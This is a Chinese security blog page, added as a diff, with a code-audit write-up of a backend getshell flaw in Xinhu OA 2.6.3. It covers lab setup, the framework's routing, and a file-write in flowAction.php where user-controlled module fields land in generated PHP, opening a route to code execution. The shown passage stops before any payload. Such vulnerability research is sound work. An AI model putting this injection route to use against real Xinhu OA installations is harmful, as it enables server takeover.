@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="在先知社区看到的一篇关于信呼OA后台getshell的文章，感觉还不错就拿来记录一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="信呼OA后台getshell分析">
+<meta property="og:url" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="在先知社区看到的一篇关于信呼OA后台getshell的文章，感觉还不错就拿来记录一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113232005.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113443429.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113700362.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725140908145.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725141057327.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725143224762.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725144721241.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725144910173.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725145536418.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725150003510.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725152525513.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724172517962.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724172923255.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724173808725.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724175433613.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725113419460.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725114029401.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725122108889.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725182332200.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725182519855.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725184458489.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725184754678.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725194816122.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725195342296.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725195642297.png">
+<meta property="article:published_time" content="2024-07-24T03:25:09.000Z">
+<meta property="article:modified_time" content="2024-07-25T12:12:32.640Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="OA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113232005.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>信呼OA后台getshell分析 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          信呼OA后台getshell分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-07-24 11:25:09" itemprop="dateCreated datePublished" datetime="2024-07-24T11:25:09+08:00">2024-07-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-07-25 20:12:32" itemprop="dateModified" datetime="2024-07-25T20:12:32+08:00">2024-07-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html" class="post-meta-item leancloud_visitors" data-flag-title="信呼OA后台getshell分析" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>在先知社区看到的一篇关于信呼OA后台getshell的文章，感觉还不错就拿来记录一下</p>
+<span id="more"></span>
+
+<h1 id="信呼OA后台getshell分析"><a href="#信呼OA后台getshell分析" class="headerlink" title="信呼OA后台getshell分析"></a>信呼OA后台getshell分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>phpstudy+信呼OA版本2.6.3</p>
+</blockquote>
+<p>源码链接：<a target="_blank" rel="noopener" href="https://github.com/rainrocka/xinhu">https://github.com/rainrocka/xinhu</a></p>
+<p>使用phpstudy创建网站，以及对应数据库</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113232005.png"></p>
+<p>然后将源码文件导入对应文件夹下</p>
+<p>访问网站进行安装</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113443429.png"></p>
+<p>安装完后告诉我们后台账号和密码<code>admin:123456</code>，出现改密码提示更新一下密码就行</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113700362.png"></p>
+<hr>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><blockquote>
+<p>了解路由结构</p>
+</blockquote>
+<p>我们先从源码index.php看起，第八行包含config.php配置文件</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725140908145.png"></p>
+<p>跟进一下，发现也包含了三个php文件</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725141057327.png"></p>
+<p>我们跟进查看，发现rockFun.php文件只是定义了一系列方法，Chajian.php文件则是定义了Chajian类，rockClass.php文件定义了rockClass类。接着如果未被定义，那么默认项目和入口分别为<code>webmain</code>和<code>index</code>，后面就是其他一些定义内容。</p>
+<p>回到index.php，<code>$_uurl</code>由<code>$rock-&gt;get(&#39;rewriteurl&#39;);</code>决定</p>
+<p>跟进一下（注意这里是<code>rewrite()</code>方法）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rewrite</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$a</span>,<span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(REWRITE==<span class="string">&#x27;true&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$a</span> == <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$s</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">			<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">elseif</span>(<span class="variable">$a</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">			<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;_&#x27;</span>.<span class="variable">$s</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;_&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;_&#x27;</span>.<span class="variable">$s</span>.<span class="string">&#x27;_a.html&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$url</span>	= <span class="string">&#x27;index.php?m=&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="string">&#x27;&#x27;</span>)<span class="variable">$url</span>.=<span class="string">&#x27;&amp;a=&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$s</span> != <span class="string">&#x27;&#x27;</span>)<span class="variable">$url</span>.=<span class="string">&#x27;&amp;s=&#x27;</span>.<span class="variable">$s</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$url</span>;	</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
+
+<p>相当于是从外部接收<code>$m,$a,$s</code>参数进行重写，返回值url</p>
+<p>由于这里默认没有接收参数，所以<code>$_uurl</code>为空，那么执行else语句跟进jm类的<code>gettoken()</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">gettoken</span>(<span class="params"><span class="variable">$na</span>, <span class="variable">$dev</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$s</span> = <span class="variable">$dev</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;rocktokenarr[<span class="variable">$na</span>]))&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;rocktokenarr[<span class="variable">$na</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$na</span>, <span class="variable">$dev</span>);</span><br><span class="line">	&#125;			</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进rock类的<code>get()</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$dev</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$val</span>=<span class="variable">$dev</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$name</span>]))<span class="variable">$val</span>=<span class="variable">$_GET</span>[<span class="variable">$name</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$val</span>))<span class="variable">$val</span>=<span class="variable">$dev</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">jmuncode</span>(<span class="variable">$val</span>, <span class="variable">$lx</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于接收GET请求参数<code>m,d,a</code></p>
+<p>不仅如此，回到index.php我们继续往下看发现还有请求参数<code>ajaxbool</code></p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725143224762.png"></p>
+<p>我们看向最后一行代码，跟进一下View.php</p>
+<p>如果参数m包含<code>|</code>，那么以<code>|</code>分割开赋值给<code>$m</code>和<code>$_m</code></p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725144721241.png"></p>
+<p>然后调用<code>strformat()</code>方法替换其中的占位符，最后分别赋值给<code>$actfile</code>和<code>$actfile1</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">strformat</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$len</span> = <span class="title function_ invoke__">func_num_args</span>();</span><br><span class="line">	<span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="variable">$len</span>; <span class="variable">$i</span>++)<span class="variable">$arr</span>[] = <span class="title function_ invoke__">func_get_arg</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="variable">$s</span>	 = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">stringformat</span>(<span class="variable">$str</span>, <span class="variable">$arr</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们继续往下看</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725144910173.png"></p>
+<p>将<code>$m</code>与<code>ClassAction</code>拼接后实例化，继续将<code>$a</code>与<code>Action</code>拼接，然后检测方法是否存在，如果存在则调用该方法</p>
+<p>具体来讲和我们路由中的传参参数有关，也就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]ClassAction类进行实例化</span><br><span class="line">如果方法存在，则调用<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]Action方法</span><br></pre></td></tr></table></figure>
+
+<p>再往下则是该CMS自写的模板解析功能</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725145536418.png"></p>
+<p>以上就是框架大概的运行原理，下面我们定义一个自己的控制器</p>
+<p>定义目录&#x2F;文件结构如下</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725150003510.png"></p>
+<p>rev1veAction.php内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rev1veClassAction</span> <span class="keyword">extends</span> <span class="title">ActionNot</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testerAction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello Word&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：这里有个坑点，参考文章的示例没有Class直接就是<code>rev1veAction</code>这样。一开始按照文章来结果复现不出来，后面调试一下才注意到这里的类名应该是拼接上<code>ClassAction</code>，原理前面也分析过就不赘述了</p>
+</blockquote>
+<p>tpl_rev1ve_tester.html内容如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>test模板<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们先登录管理员账号，然后执行以下命令即可实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?d=test&amp;m=rev1ve&amp;a=tester</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725152525513.png"></p>
+<hr>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><strong>漏洞触发点</strong></p>
+<p>位于<code>webmain\main\flow\flowAction.php</code>的<code>inputAction()</code>方法</p>
+<p>我们跟进一下，往下翻代码注意到存在写入php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">		$apaths		= &#x27;&#x27;.P.&#x27;/flow/input/mode_&#x27;.$modenum.&#x27;Action.php&#x27;;</span><br><span class="line">		$apath		= &#x27;&#x27;.ROOT_PATH.&#x27;/&#x27;.$apaths.&#x27;&#x27;;</span><br><span class="line">		if(!file_exists($apath))&#123;</span><br><span class="line">			$stra = &#x27;&lt;?php</span><br><span class="line">/**</span><br><span class="line">*	此文件是流程模块【&#x27;.$modenum.&#x27;.&#x27;.$rs[&#x27;name&#x27;].&#x27;】对应控制器接口文件。</span><br><span class="line">*/ </span><br><span class="line">			//省略部分无关代码</span><br><span class="line">			&#x27;;</span><br><span class="line">			$this-&gt;rock-&gt;createtxt($apaths, $stra);</span><br></pre></td></tr></table></figure>
+
+<p>这里的参数<code>$modenum</code>和<code>$rs[&#39;name&#39;]</code>被拼接到写入文件的注释里，我们可以尝试注释掉前后代码实现RCE</p>
+<p>看看两个参数是怎么来的，往上翻</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724172517962.png"></p>
+<p>这里<code>$rs</code>是调用<code>m()</code>跟进一下，并传参为<code>flow__get</code>的表名</p>
+<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724172923255.png"></p>
+<p>第34行代码出现实例化Model类，那么就继续调用该类的<code>getone()</code>方法</p>
